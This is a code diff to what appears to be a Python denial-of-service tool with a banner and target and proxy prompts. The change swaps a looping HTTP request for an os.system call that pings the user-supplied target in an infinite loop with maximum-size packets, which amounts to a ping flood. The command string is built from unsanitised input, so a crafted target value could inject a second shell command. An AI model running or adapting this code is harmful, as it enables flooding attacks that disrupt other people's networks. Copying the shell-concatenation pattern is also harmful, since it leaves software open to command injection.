@@ -1,5 +1,6 @@
 from urllib import request
 from urllib.parse import unquote
+import os
 
 
 print('''██████╗ ██████╗  ██████╗ ███████╗          
@@ -51,7 +52,7 @@ Enter 2 to select domain mode.''')
 		print()
 		proxy = proxyip + ":" + proxyport
 		while True:
-			request.urlopen(target)
+			os.system('ping '+ target +' -t -l 65500 -w 1')
 			print(tries)
 			tries = tries + 1
 		'''
